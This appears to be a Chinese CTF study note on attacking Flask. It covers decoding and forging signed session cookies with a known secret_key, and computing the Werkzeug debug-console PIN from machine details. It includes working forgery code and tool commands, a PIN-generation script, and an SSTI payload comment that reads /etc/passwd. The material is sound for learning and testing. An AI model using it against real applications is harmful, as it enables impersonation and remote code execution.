[TOC]

### session 信息泄露 & 伪造

[SecMap - Flask - Tr0y's Blog](https://www.tr0y.wang/2022/05/16/SecMap-flask)

session 的作用大家都比较熟悉了，就不用介绍了。

它的常见实现形式是当用户发起一个请求的时候，后端会检查该请求中是否包含 sessionid，如果没有则会创造一个叫 sessionid 的 cookie，用于区分不同的 session。sessionid 返回给浏览器，并将 sessionid 保存到服务器的内存里面；当已经有了 sessionid，服务端会检查找到与该 sessionid 相匹配的信息直接用。

所以显而易见，session 和 sessionid 都是后端生成的。且由于 session 是后端识别不同用户的重要依据，而 sessionid 又是识别 session 的唯一依据，所以 session 一般都保存在服务端避免被轻易窃取，只返回随机生成的 sessionid 给客户端。对于攻击者来说，假设需要冒充其他用户，那么必须能够猜到其他用户的 sessionid，这是比较困难的。

对于 flask 来说，它的 session 不是保存到内存里的，而是直接把整个 session 都塞到 cookie 里返回给客户端。那么这会导致一个问题，如果我可以直接按照格式生成一个 session 放在 cookie 里，那么就可以达到欺骗后端的效果。

阅读源码可知，flask 生成 session 的时候会进行序列化，主要有以下几个步骤：

1. 用 `json.dumps` 将对象转换成 json 字符串
2. 如果第一步的结果可以被压缩，则用 zlib 库进行压缩
3. 进行 base64 编码
4. 通过 secret_key 和 hmac 算法（flask 这里的 hmac 默认用 sha1 进行 hash，还多了一个 salt，默认是 `cookie-session`）对结果进行签名，将签名附在结果后面（用 `.` 拼接）。如果第二步有压缩的话，结果的开头会加上 `.` 标记。

可以看到，最后一步解决了用户篡改 session 的安全问题，因为在不知道 secret_key 的情况下，是无法伪造签名的。

所以这会直接导致 2 个可能的安全问题：

1. 数字签名的作用是防篡改，没有保密的作用。所以 flask 的 session 解开之后可以直接看到明文信息，可能会导致数据泄露
2. 如果知道 secret_key 那么可以伪造任意有效的 session（这个说法并不完全准确）

>[noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder (github.com)](https://github.com/noraj/flask-session-cookie-manager)

```python
from flask import Flask, session


app = Flask(__name__)
app.secret_key = 'wi1shu'

@app.route('/')
def hello():
    if session.get("user", None):
        user = session.get("user", None)
    else:
        session['user'] = user = 'user'
    return f'Welcome, {user}!'


app.run(debug=True, port=50001)
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231210163520237.png)

session为`eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4`，可以通过flask-session-cookie-manager-master将其解码或者自行进行base64解码

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231210163933696.png)

>`URLSafeTimedSerializer` 是 Flask-WTF 库中的一个类，用于生成和验证包含时间戳的 URL 安全的序列化（serialized）令牌。它主要用于在 Web 应用中处理安全性相关的功能，例如生成带有时效性的重置密码链接或身份验证令牌。
>
>`URLSafeTimedSerializer` 的作用：
>
>1. **生成 URL 安全的令牌：** 通过将数据序列化并附加时间戳，生成一个 URL 安全的字符串令牌。这个令牌可以包含一些信息（如用户 ID、操作类型等），并且由于是 URL 安全的，可以方便地用于构建重置密码链接或其他包含敏感信息的 URL。
>2. **验证令牌的有效性和时效性：** 可以通过令牌的解析来验证令牌的有效性和时效性。这有助于确保令牌在一段时间后过期，从而提高安全性。一旦令牌过期，就不能再被验证。
>
>```python
>from flask import Flask
>from itsdangerous import URLSafeTimedSerializer
>
>app = Flask(__name__)
>app.config['SECRET_KEY'] = 'wi1shu'
>
>serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
>
># 生成令牌
>user_id = 123
>token = serializer.dumps(user_id, salt='reset-password')
>
># 验证令牌
>try:
>    data = serializer.loads(token, salt='reset-password', max_age=3600)  # 令牌有效期为 1 小时
>    print(f"Valid token. User ID: {data}")
>except:
>    print("Invalid or expired token.")
>```

可利用URLSafeTimedSerializer进行解码与编码，也可以利用flask-session-cookie-manager-master

```python
from itsdangerous import URLSafeTimedSerializer, base64_decode, encoding

session = "eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4"
session_list = session.split(".")

print(base64_decode(session_list[0]))
# b'{"user":"user"}'

print(base64_decode(session_list[1]))
# b'eux8'

# 验证session
print(URLSafeTimedSerializer('wi1shu',
                             salt="cookie-session", # 默认值
                             signer_kwargs={"key_derivation": "hmac"}
                             ).loads_unsafe(session))
# (True, {'user': 'user'})

# 生成session
print(URLSafeTimedSerializer('wi1shu',
                             salt="cookie-session",  # 默认
                             signer_kwargs={"key_derivation": "hmac"}
                             ).dumps({'user': 'admin'}))
# eyJ1c2VyIjoiYWRtaW4ifQ.ZXV76w.jvG0kY94ZYQ2fVYDnwebKFD4Ny8
```

```
利用flask-session-cookie-manager-master
python flask_session_cookie_manager3.py decode -c eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4
b'{"user":"user"}'

python flask_session_cookie_manager3.py decode -c eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4 -s wi1shu
{'user': 'user'}

python flask_session_cookie_manager3.py encode -t "{'user':'admin'}" -s wi1shu
eyJ1c2VyIjoiYWRtaW4ifQ.ZXV8ZA.8JmyoQrizHyJrk1TL84S1xIqDgs
```



### pin码伪造

pin码计算脚本

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'www',  # flask执⾏whoami获取
    'flask.app',  # modname，linux基本上都是这个，mac有所不同
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/dist-packages/flask/app.py'  # 可以通过debug报错的⻚⾯观察到。
]
# "".__class__.__bases__[0].__subclasses__()[279]('cat+/etc/passwd',shell=True,stdout=-1).communicate()[0].strip()
private_bits = [
    '2485377892354',  # ssti获取/sys/class/net/eth0/address
    '6079fc23-7220-4a30-aab3-c0a7a4f5fb62ea7476749876bc8a6302ce91efe1a0461e74a1778f0b9d516318fc5a032036e1'
    # ssti获取/proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b'pinsalt')
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

```